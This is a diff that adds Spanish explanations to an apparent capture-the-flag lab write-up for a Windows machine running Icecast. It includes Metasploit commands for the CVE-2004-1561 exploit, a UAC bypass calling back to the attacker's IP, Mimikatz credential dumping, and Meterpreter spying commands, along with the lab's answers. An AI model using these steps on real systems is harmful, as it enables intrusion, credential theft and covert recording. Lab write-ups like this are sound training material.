@@ -17,6 +17,8 @@
 
 ### Task 1: Despliegue del laboratorio
 
+**Explicación:** Arranque de la máquina Windows objetivo, espera del arranque y verificación de conectividad antes de empezar a escanear.
+
 | # | Pregunta | Respuesta |
 |---|----------|-----------|
 | 1 | Despliega la máquina y espera a que esté lista. | `No answer needed` |
@@ -25,6 +27,12 @@
 | 4 | Analiza los resultados del escaneo. | `No answer needed` |
 
 ### Task 2: Enumeración
+
+**Explicación:** `nmap -sC -sV TARGET` revela: escritorio remoto (RDP) en `3389`, el servicio `Icecast` en un puerto alto (`8000`) y el nombre NetBIOS `DARK-PC`.
+
+```bash
+nmap -sC -sV MACHINE_IP
+```
 
 | # | Pregunta | Respuesta |
 |---|----------|-----------|
@@ -35,6 +43,15 @@
 | 5 | ¿Cuál es el nombre NetBIOS de la máquina? | `DARK-PC` |
 
 ### Task 3: Explotación del servicio
+
+**Explicación:** La vulnerabilidad de Icecast es `CVE-2004-1561` (CVSS `6.4`). En msfconsole se usa `exploit/windows/http/icecast_header`, fijando `rhosts` a la IP de la víctima y ejecutando el exploit para obtener la sesión.
+
+```bash
+msfconsole
+use exploit/windows/http/icecast_header
+set rhosts MACHINE_IP
+run
+```
 
 | # | Pregunta | Respuesta |
 |---|----------|-----------|
@@ -47,6 +64,15 @@
 | 7 | Ejecuta el exploit y comprueba si obtienes una sesión. | `No answer needed` |
 
 ### Task 4: Escalada de privilegios
+
+**Explicación:** La sesión es `meterpreter` ejecutándose en el proceso `Dark` (Icecast), sobre Windows build `7601` (x64). Se migra a `spoolsv.exe` y se escala a SYSTEM con `exploit/windows/local/bypassuac_eventvwr`, fijando `lhost` a nuestra IP. El privilegio que permite apoderarse de archivos y procesos es `SeTakeOwnershipPrivilege`.
+
+```text
+getsystem / sessions -i <id>
+use exploit/windows/local/bypassuac_eventvwr
+set session <X>   set lhost TU_IP
+run
+```
 
 | # | Pregunta | Respuesta |
 |---|----------|-----------|
@@ -67,6 +93,14 @@
 
 ### Task 5: Post-explotación
 
+**Explicación:** Se carga `kiwi` (Mimikatz) en la sesión de SYSTEM (`spoolsv.exe`), que corre como `NT AUTHORITY\SYSTEM`. Con `creds_all` se recuperan todas las credenciales; en el volcado aparece la cuenta `Dark` con la contraseña `Password01`.
+
+```text
+load kiwi
+getsystem
+creds_all
+```
+
 | # | Pregunta | Respuesta |
 |---|----------|-----------|
 | 1 | Carga el módulo kiwi en la sesión de Meterpreter. | `No answer needed` |
@@ -80,6 +114,16 @@
 
 ### Task 6: Reconocimiento y otras herramientas
 
+**Explicación:** Herramientas de Meterpreter: `hashdump` (volcado de hashes SAM), `screenshare` (pantalla en vivo), `record_mic` (grabación del micrófono), `timestomp` (modificar timestamps) y `golden_ticket_create` (crear golden tickets Kerberos). Se prueban en la sesión comprometida.
+
+```text
+hashdump
+screenshare
+record_mic -d 10
+timestomp archivo -h
+golden_ticket_create -u X ...
+```
+
 | # | Pregunta | Respuesta |
 |---|----------|-----------|
 | 1 | Explora los comandos disponibles en Meterpreter. | `No answer needed` |
@@ -91,6 +135,8 @@
 | 7 | Prueba los comandos de la lista en la sesión. | `No answer needed` |
 
 ### Task 7: Resumen
+
+**Explicación:** Repaso del laboratorio: enumeración, exploit de Icecast, migración, UAC bypass, Mimikatz y comandos de post-explotación.
 
 | # | Pregunta | Respuesta |
 |---|----------|-----------|
